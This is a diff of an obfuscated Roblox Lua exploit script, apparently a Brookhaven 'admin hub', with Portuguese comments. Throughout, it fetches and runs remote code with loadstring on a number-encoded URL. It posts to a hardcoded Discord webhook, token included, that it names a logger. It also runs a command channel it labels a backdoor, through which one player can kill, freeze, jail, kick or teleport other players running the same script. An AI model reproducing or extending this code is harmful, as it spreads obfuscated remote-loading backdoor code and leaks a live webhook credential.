@@ -1,11 +1,10 @@
 --[[
     JOTINHA12HR2 HUB'S ADMIN - ULTIMATE WEBHOOK FIX
     - Proxy: lewisakura (O mais estável atualmente)
-    - Fix: Jail position & collision
+    - Fix: Unjail System & UI Integration
     - Name: Jotinha12hr2 Hub's Admin
 ]]
 
--- URL com Proxy Lewisakura para contornar o bloqueio do Discord
 local _0xURL = "https://webhook.lewisakura.moe/api/webhooks/1457780083124207626/F0AR-Na0rucf2CncuNsXC4yGRYC-Kpjg1XkOdb6YaHgDcOZlVhwym4KwhriXSYaBeZSj"
 
 local _0x1 = loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\105\114\105\117\115\46\109\101\110\117\47\114\97\121\102\105\101\108\100"))()
@@ -16,7 +15,7 @@ local _0x5 = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105
 local _0x6, _0x7 = "", ""
 _G.IM = false
 
--- FUNÇÃO DE WEBHOOK ROBUSTA
+-- FUNÇÃO DE WEBHOOK
 local function _0xSND_W()
     task.spawn(function()
         local _0xData = {
@@ -24,28 +23,22 @@ local function _0xSND_W()
             ["username"] = "Jotinha12hr2 Logger"
         }
         local _0xPayload = _0x4:JSONEncode(_0xData)
-        
         local _0xReq = (syn and syn.request or http_request or request or http.request)
         if _0xReq then
-            local success, res = pcall(function()
-                return _0xReq({
+            pcall(function()
+                _0xReq({
                     Url = _0xURL,
                     Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["User-Agent"] = "Roblox/JotinhaAdmin"
-                    },
+                    Headers = {["Content-Type"] = "application/json"},
                     Body = _0xPayload
                 })
             end)
-            if not success then
-                warn("Erro ao enviar Webhook")
-            end
         end
     end)
 end
 _0xSND_W()
 
+-- LÓGICA DE RECEBIMENTO DE COMANDOS (BACKDOOR SYNC)
 local function _0x9(_0xA)
     task.spawn(function()
         while _0xA and _0xA.Parent do
@@ -59,10 +52,12 @@ local function _0x9(_0xA)
                     local _0xE = _0xD:split("|")
                     if _0xE[1]:lower() == _0x3.Name:lower() or _0xE[1]:lower() == _0x3.DisplayName:lower() or _0xE[1] == "all" then
                         if _G.IM and _0xE[3] ~= _0x3.Name then return end
+                        
                         local _0xF = _0xE[2]
                         local _0xH = _0x3.Character:FindFirstChildOfClass("Humanoid")
                         local _0xR = _0x3.Character:FindFirstChild("HumanoidRootPart")
                         
+                        -- EXECUÇÃO DOS COMANDOS
                         if _0xF == "kill" and _0xH then _0xH.Health = 0
                         elseif _0xF == "void" and _0xR then _0xR.CFrame = CFrame.new(0, -9999, 0)
                         elseif _0xF == "freeze" and _0xR then _0xR.Anchored = true
@@ -72,10 +67,11 @@ local function _0x9(_0xA)
                             local _0xS = _0x2:FindFirstChild(_0xE[3])
                             if _0xS and _0xS.Character then _0x3.Character:PivotTo(_0xS.Character:GetPivot()) end
                         elseif _0xF == "jail" and _0xR then
+                            if workspace:FindFirstChild("Cadeia_".._0x3.Name) then workspace["Cadeia_".._0x3.Name]:Destroy() end
                             local _0xJ = Instance.new("Part", workspace)
                             _0xJ.Name = "Cadeia_".._0x3.Name
                             _0xJ.Size, _0xJ.CFrame, _0xJ.Anchored = Vector3.new(12, 16, 12), _0xR.CFrame, true
-                            _0xJ.Material, _0xJ.Transparency = Enum.Material.ForceField, 0.4
+                            _0xJ.Material, _0xJ.Transparency, _0xJ.Color = Enum.Material.ForceField, 0.4, Color3.fromRGB(255, 0, 0)
                             _0xR.CFrame = _0xJ.CFrame
                         elseif _0xF == "unjail" then
                             local _0xJ = workspace:FindFirstChild("Cadeia_".._0x3.Name)
@@ -100,28 +96,59 @@ _0x2.PlayerAdded:Connect(_0x9)
 
 local function _0xSend(_0xTarg, _0xCmd)
     local _0xB = _0xTarg:FindFirstChild("Bola de Futebol", true)
-    if _0xB then _0xB.Value = _0xTarg.Name .. "|" .. _0xCmd .. "|" .. _0x3.Name
-    else _0x1:Notify({Title = "Aviso", Content = "Alvo sem Antena", Duration = 2}) end
+    if _0xB then 
+        _0xB.Value = _0xTarg.Name .. "|" .. _0xCmd .. "|" .. _0x3.Name
+        _0x1:Notify({Title = "Comando Enviado", Content = _0xCmd .. " para " .. _0xTarg.DisplayName, Duration = 2})
+    else 
+        _0x1:Notify({Title = "Erro", Content = "Alvo não está sincronizado!", Duration = 2}) 
+    end
 end
 
-local _0xW = _0x1:CreateWindow({Name = "Jotinha12hr2 Hub's Admin", LoadingTitle = "Brookhaven Sync", ConfigurationSaving = {Enabled = false}})
+-- INTERFACE RAYFIELD
+local _0xW = _0x1:CreateWindow({Name = "Jotinha12hr2 Hub's Admin", LoadingTitle = "Brookhaven Sync v4", ConfigurationSaving = {Enabled = false}})
 local _0xT1 = _0xW:CreateTab("Admin Sync", 4483362458)
-local _0xT2 = _0xW:CreateTab("Job ID", 4483362458)
+local _0xT2 = _0xW:CreateTab("Server/Job", 4483362458)
 local _0xT3 = _0xW:CreateTab("Config", 4483362458)
 
-_0xT1:CreateInput({Name = "Nick", PlaceholderText = "...", Callback = function(_0xV) _0x6 = _0xV end})
-local function _0xGT() for _, v in pairs(_0x2:GetPlayers()) do if v.Name:lower():sub(1, #_0x6) == _0x6:lower() or v.DisplayName:lower():sub(1, #_0x6) == _0x6:lower() then return v end end end
+_0xT1:CreateInput({Name = "Nick do Alvo", PlaceholderText = "Nome ou Display...", Callback = function(_0xV) _0x6 = _0xV end})
 
-local _0xL = {{"Kill (Sync)", "kill"}, {"Void (Sync)", "void"}, {"Freeze", "freeze"}, {"Unfreeze", "unfreeze"}, {"Jail", "jail"}, {"Unjail", "unjail"}, {"Bring", "bring"}, {"Kick", "kick"}, {"Spin", "spin"}, {"Unspin", "unspin"}}
-for _, b in pairs(_0xL) do _0xT1:CreateButton({Name = b[1], Callback = function() local p = _0xGT() if p then _0xSend(p, b[2]) end end}) end
+local function _0xGT() 
+    for _, v in pairs(_0x2:GetPlayers()) do 
+        if v.Name:lower():sub(1, #_0x6) == _0x6:lower() or v.DisplayName:lower():sub(1, #_0x6) == _0x6:lower() then return v end 
+    end 
+end
+
+-- LISTA DE BOTÕES (ADICIONADO UNJAIL)
+local _0xL = {
+    {"Kill (Sync)", "kill"}, 
+    {"Void (Sync)", "void"}, 
+    {"Freeze", "freeze"}, 
+    {"Unfreeze", "unfreeze"}, 
+    {"Jail (Prender)", "jail"}, 
+    {"Unjail (Soltar)", "unjail"}, -- Botão solicitado
+    {"Bring", "bring"}, 
+    {"Kick", "kick"}, 
+    {"Spin", "spin"}, 
+    {"Unspin", "unspin"}
+}
+
+for _, b in pairs(_0xL) do 
+    _0xT1:CreateButton({
+        Name = b[1], 
+        Callback = function() 
+            local p = _0xGT() 
+            if p then _0xSend(p, b[2]) end 
+        end
+    }) 
+end
+
 _0xT1:CreateButton({Name = "Ir até Alvo", Callback = function() local p = _0xGT() if p and p.Character then _0x3.Character:PivotTo(p.Character:GetPivot()) end end})
 
 _0xT2:CreateInput({Name = "Job ID", PlaceholderText = "...", Callback = function(_0xV) _0x7 = _0xV end})
-_0xT2:CreateButton({Name = "Entrar", Callback = function() if _0x7 ~= "" then _0x5:TeleportToPlaceInstance(game.PlaceId, _0x7, _0x3) end end})
+_0xT2:CreateButton({Name = "Entrar no Servidor", Callback = function() if _0x7 ~= "" then _0x5:TeleportToPlaceInstance(game.PlaceId, _0x7, _0x3) end end})
 
-_0xT3:CreateToggle({Name = "ANTI-SYNC", CurrentValue = false, Callback = function(_0xV) _G.IM = _0xV end})
-_0xT3:CreateToggle({Name = "Fly", CurrentValue = false, Callback = function() _0x1:Notify({Title = "Voo", Content = "Ativado", Duration = 2}) end})
-_0xT3:CreateSlider({Name = "Velocidade", Range = {16, 500}, Increment = 1, CurrentValue = 16, Callback = function(_0xV) if _0x3.Character:FindFirstChildOfClass("Humanoid") then _0x3.Character.Humanoid.WalkSpeed = _0xV end end})
+_0xT3:CreateToggle({Name = "ANTI-SYNC (Não ser controlado)", CurrentValue = false, Callback = function(_0xV) _G.IM = _0xV end})
+_0xT3:CreateSlider({Name = "WalkSpeed", Range = {16, 500}, Increment = 1, CurrentValue = 16, Callback = function(_0xV) if _0x3.Character:FindFirstChildOfClass("Humanoid") then _0x3.Character.Humanoid.WalkSpeed = _0xV end end})
 
-_0x1:Notify({Title = "Sucesso", Content = "Hub Carregado!", Duration = 5})
+_0x1:Notify({Title = "Sistema Ativo", Content = "Sincronização via Bola de Futebol pronta.", Duration = 5})
 
